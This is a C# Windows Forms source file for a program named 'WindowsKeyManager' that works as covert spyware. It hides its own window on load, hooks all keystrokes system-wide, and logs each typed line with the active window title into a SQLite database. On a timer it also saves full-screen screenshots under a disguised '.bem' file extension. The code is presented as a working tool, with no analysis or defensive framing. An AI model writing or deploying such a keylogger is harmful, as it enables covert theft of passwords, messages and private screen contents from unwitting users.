using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using WindowsKeyManager.Properties;

namespace WindowsKeyManager
{
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using MouseKeyHook;
    using SQLite;

    public partial class Main : Form
    {
        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private string GetActiveWindowTitle()
        {
            StringBuilder builder = new StringBuilder(255);
            GetWindowText(GetForegroundWindow(), builder, 255);
            return builder.ToString().Trim();

        }

        private IKeyboardMouseEvents _mEvents;

        //private StringBuilder cachBuilder;
        private string _lineBuilder;
        private string _logDbPath;

        public Main()
        {
            InitializeComponent();
            _logDbPath = Path.Combine(Settings.Default.LogFilePath, "logmanager.db");
            CreateDbIfNot();
            SubscribeGlobal();
        }



        private void SubscribeApplication()
        {
            Unsubscribe();
            Subscribe(Hook.AppEvents());
        }

        private void SubscribeGlobal()
        {
            Unsubscribe();
            Subscribe(Hook.GlobalEvents());
        }

        private void Subscribe(IKeyboardMouseEvents events)
        {
            _mEvents = events;
            
            //            m_Events.KeyDown += OnKeyDown;
            //            m_Events.KeyUp += OnKeyUp;
            _mEvents.KeyPress += HookManager_KeyPress;

            //            m_Events.MouseUp += OnMouseUp;
            //            m_Events.MouseClick += OnMouseClick;
            //            m_Events.MouseDoubleClick += OnMouseDoubleClick;
            //
            //            m_Events.MouseMove += HookManager_MouseMove;
            //
            //            m_Events.MouseDragStarted += OnMouseDragStarted;
            //            m_Events.MouseDragFinished += OnMouseDragFinished;
            //
            //            if (checkBoxSupressMouseWheel.Checked)
            //                m_Events.MouseWheelExt += HookManager_MouseWheelExt;
            //            else
            //                m_Events.MouseWheel += HookManager_MouseWheel;
            //
            //            if (checkBoxSuppressMouse.Checked)
            //                m_Events.MouseDownExt += HookManager_Supress;
            //            else
            //                m_Events.MouseDown += OnMouseDown;
        }

        private void Unsubscribe()
        {
            if (_mEvents == null) return;
            //timer1.Stop();
            //            m_Events.KeyDown -= OnKeyDown;
            //            m_Events.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= HookManager_KeyPress;

            //            m_Events.MouseUp -= OnMouseUp;
            //            m_Events.MouseClick -= OnMouseClick;
            //            m_Events.MouseDoubleClick -= OnMouseDoubleClick;
            //
            //            m_Events.MouseMove -= HookManager_MouseMove;
            //
            //            m_Events.MouseDragStarted -= OnMouseDragStarted;
            //            m_Events.MouseDragFinished -= OnMouseDragFinished;
            //
            //            if (checkBoxSupressMouseWheel.Checked)
            //                m_Events.MouseWheelExt -= HookManager_MouseWheelExt;
            //            else
            //                m_Events.MouseWheel -= HookManager_MouseWheel;
            //
            //            if (checkBoxSuppressMouse.Checked)
            //                m_Events.MouseDownExt -= HookManager_Supress;
            //            else
            //                m_Events.MouseDown -= OnMouseDown;

            _mEvents.Dispose();
            _mEvents = null;
        }

        private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
            var test = e.KeyChar.ToString();
            Console.WriteLine(test);
            if (e.KeyChar == (char)Keys.Back)
            {
                if (_lineBuilder.Length > 1) _lineBuilder = _lineBuilder.Substring(0, _lineBuilder.Length - 1);
                return;
            }

            if (e.KeyChar == (char)Keys.Enter)
            {
                InsertLoger(_lineBuilder);
                _lineBuilder = "";
                return;
            }

            _lineBuilder += e.KeyChar.ToString();
        }

        private void InsertLoger(string line)

        {
            if (line.Trim().Length > 1)
            {
                var windowsTitle = GetActiveWindowTitle();
                var db = new SQLiteAsyncConnection(_logDbPath);
                db.InsertAsync(new Loger()
                {
                    TextLog = line,
                    DateLog = DateTime.Now.ToString("G"),
                    ApplicationTittle = windowsTitle
                });
            }
        }

        private void CreateDbIfNot()
        {
            // var path = Path.Combine(_logDbPath, "Logmanager.db");
            if (!File.Exists(_logDbPath))
            {
                var db = new SQLiteConnection(_logDbPath);
                db.CreateTable<Loger>();
                db.Insert(new Loger()
                {
                    ApplicationTittle = "Test",
                    TextLog = "Text log ",
                    DateLog = DateTime.Now.ToString("G")
                });
            }
        }

        private void ScreenCopy()
        {
            Bitmap screenshot = new Bitmap(SystemInformation.VirtualScreen.Width,
                SystemInformation.VirtualScreen.Height,
                PixelFormat.Format32bppArgb);
            Graphics screenGraph = Graphics.FromImage(screenshot);
            screenGraph.CopyFromScreen(SystemInformation.VirtualScreen.X,
                SystemInformation.VirtualScreen.Y,
                0,
                0,
                SystemInformation.VirtualScreen.Size,
                CopyPixelOperation.SourceCopy);
            screenshot.Save(Path.Combine(Settings.Default.LogFilePath, $@"Screenshot{DateTime.Now:yyyMMddhhmmss}.bem"), System.Drawing.Imaging.ImageFormat.Png);
            //pictureBox1.Image = screenshot;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            ScreenCopy();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            Hide();
            timer2.Start();
            ScreenCopy();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            ScreenCopy();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            ScreenCopy();
        }
    }

    [Table("Logs")]
    public class Loger
    {
        [PrimaryKey, AutoIncrement, Column("IdLog")]
        public int Id { get; set; }
        [MaxLength(255)]
        public string ApplicationTittle { get; set; }
        public string TextLog { get; set; }
        public string DateLog { get; set; } = DateTime.Now.ToString("G");
    }

}
